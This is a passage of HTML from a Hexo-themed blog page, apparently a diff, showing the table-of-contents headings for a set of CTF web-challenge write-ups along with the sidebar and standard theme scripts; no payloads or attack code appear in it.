href="#%E5%AE%89%E5%85%A8%E6%94%B9%E8%BF%9B%E7%82%B9"><span class="toc-number">2.0.5.</span> <span class="toc-text">安全改进点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="toc-number">2.0.5.1.</span> <span class="toc-text">1. 输入过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8-assert-%E5%87%BD%E6%95%B0"><span class="toc-number">2.0.5.2.</span> <span class="toc-text">2. 避免使用 assert 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%B7%AF%E5%BE%84%E6%A3%80%E6%9F%A5"><span class="toc-number">2.0.5.3.</span> <span class="toc-text">3. 路径检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E6%80%A7%E6%A3%80%E6%9F%A5"><span class="toc-number">2.0.5.4.</span> <span class="toc-text">4. 文件存在性检查</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ics-05"><span class="toc-number">3.</span> <span class="toc-text">ics-05</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%81"><span class="toc-number">3.0.1.</span> <span class="toc-text">可能是文件包含漏洞！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.0.2.</span> <span class="toc-text">代码注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">3.0.3.</span> <span class="toc-text">构造代码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload%EF%BC%9A"><span class="toc-number">3.0.4.</span> <span class="toc-text">最终payload：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.0.4.1.</span> <span class="toc-text">1.漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-PHP%E7%9A%84preg-replace%E5%87%BD%E6%95%B0%E4%B8%8E-e%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">3.0.4.1.1.</span> <span class="toc-text">(1) PHP的preg_replace函数与&#x2F;e修饰符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.0.4.1.2.</span> <span class="toc-text">(2) 漏洞代码示例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0"><span class="toc-number">3.0.4.1.3.</span> <span class="toc-text">(3) 攻击参数构造</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B%E5%88%86%E8%A7%A3"><span class="toc-number">3.0.4.2.</span> <span class="toc-text">2. 攻击过程分解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E9%98%B6%E6%AE%B5"><span class="toc-number">3.0.4.2.1.</span> <span class="toc-text">(1) 正则匹配阶段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%98%B6%E6%AE%B5"><span class="toc-number">3.0.4.2.2.</span> <span class="toc-text">(2) 代码执行阶段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9C"><span class="toc-number">3.0.4.2.3.</span> <span class="toc-text">(3) 输出结果</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%85%B3%E9%94%AE%E7%BB%86%E8%8A%82%E8%AF%B4%E6%98%8E"><span class="toc-number">3.0.4.3.</span> <span class="toc-text">3. 关键细节说明</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%B8%BA%E4%BD%95%E7%A9%BA%E6%A0%BC%E7%94%A8-%E6%9B%BF%E4%BB%A3%EF%BC%9F"><span class="toc-number">3.0.4.3.1.</span> <span class="toc-text">(1) 为何空格用+替代？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-e%E4%BF%AE%E9%A5%B0%E7%AC%A6%E7%9A%84%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6"><span class="toc-number">3.0.4.3.2.</span> <span class="toc-text">(2) &#x2F;e修饰符的版本限制</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-python-template-injection"><span class="toc-number">4.</span> <span class="toc-text">Web_python_template_injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unseping"><span class="toc-number">5.</span> <span class="toc-text">unseping</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8E%E6%98%AF%E6%9E%84%E9%80%A0%EF%BC%9A"><span class="toc-number">5.0.1.</span> <span class="toc-text">于是构造：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">5.0.2.</span> <span class="toc-text">\绕过：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">5.0.3.</span> <span class="toc-text">空格绕过:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E6%9B%BF%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">5.0.4.</span> <span class="toc-text">&#x2F;代替绕过：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%91%BD%E4%BB%A4%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90"><span class="toc-number">5.0.5.</span> <span class="toc-text">1. 命令结构解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload%EF%BC%9A-1"><span class="toc-number">5.0.6.</span> <span class="toc-text">最终payload：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E6%96%B9%E6%B3%95-chr%E6%B3%95"><span class="toc-number">5.0.7.</span> <span class="toc-text">错误方法(chr法)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E7%9A%84-chr-%E7%BB%95%E8%BF%87%E5%A4%B1%E8%B4%A5%EF%BC%9F"><span class="toc-number">5.0.7.1.</span> <span class="toc-text">为什么你的 chr 绕过失败？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%BA%E4%BB%80%E4%B9%88-SSTI-%E4%B8%AD-chr-%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="toc-number">5.0.7.2.</span> <span class="toc-text">3. 为什么 SSTI 中 chr 可以绕过？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-include"><span class="toc-number">5.0.8.</span> <span class="toc-text">file_include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A%E5%88%A9%E7%94%A8%E4%BA%86%E8%BD%AC%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.0.9.</span> <span class="toc-text">总结：利用了转码漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E5%99%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">5.0.10.</span> <span class="toc-text">其他常见过滤器示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B"><span class="toc-number">5.0.10.1.</span> <span class="toc-text">(1) 压缩与解压</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86"><span class="toc-number">5.0.10.2.</span> <span class="toc-text">(2) 字符串处理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%A4%9A%E8%BF%87%E6%BB%A4%E5%99%A8%E9%93%BE"><span class="toc-number">5.0.10.3.</span> <span class="toc-text">(3) 多过滤器链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2"><span class="toc-number">5.0.10.4.</span> <span class="toc-text">(4) 字符替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86"><span class="toc-number">5.0.10.5.</span> <span class="toc-text">(5) 加密与解密</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%B8%8D%E5%90%8C%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%AE%9E%E6%88%98%E7%94%A8%E9%80%94"><span class="toc-number">5.0.11.</span> <span class="toc-text">3. 不同过滤器的实战用途</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E9%80%94-1%EF%BC%9A%E7%BB%95%E8%BF%87%E6%AD%BB%E4%BA%A1%E4%BB%A3%E7%A0%81"><span class="toc-number">5.0.11.1.</span> <span class="toc-text">用途 1：绕过死亡代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E9%80%94-2%EF%BC%9A%E9%9A%90%E8%97%8F%E6%95%8F%E6%84%9F%E5%AD%97%E7%AC%A6"><span class="toc-number">5.0.11.2.</span> <span class="toc-text">用途 2：隐藏敏感字符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E9%80%94-3%EF%BC%9A%E5%A4%84%E7%90%86%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6"><span class="toc-number">5.0.11.3.</span> <span class="toc-text">用途 3：处理不可见字符</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">5.0.12.</span> <span class="toc-text">4. 防御建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.0.13.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#catcat-new"><span class="toc-number">6.</span> <span class="toc-text">catcat-new</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%B7%E4%BD%93%E5%8F%82%E8%80%83%E4%B8%93%E9%97%A8%E8%AE%B2%E8%A7%A3"><span class="toc-number">6.0.1.</span> <span class="toc-text">1.文件包含具体参考专门讲解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-cookie%E5%8A%AB%E6%8C%81%EF%BC%9A"><span class="toc-number">6.0.2.</span> <span class="toc-text">2.cookie劫持：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE-proc-self-maps-%E8%8E%B7%E5%8F%96%E5%8F%AF%E8%AF%BB%E5%86%85%E5%AE%B9%E7%9A%84%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84"><span class="toc-number">6.0.2.1.</span> <span class="toc-text">直接访问**&#x2F;proc&#x2F;self&#x2F;maps**获取可读内容的内存映射</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%88%86%E7%A0%B4%E5%BE%97%E5%88%B0cookie-key"><span class="toc-number">6.0.2.2.</span> <span class="toc-text">脚本爆破得到cookie_key:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E8%A7%A3%E5%AF%86%EF%BC%9A"><span class="toc-number">6.0.2.3.</span> <span class="toc-text">使用工具解密：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8A%A0%E5%AF%86%EF%BC%9A"><span class="toc-number">6.0.2.4.</span> <span class="toc-text">使用工具加密：</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
+  <div class="sidebar-author-name">Flight-star</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">36</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
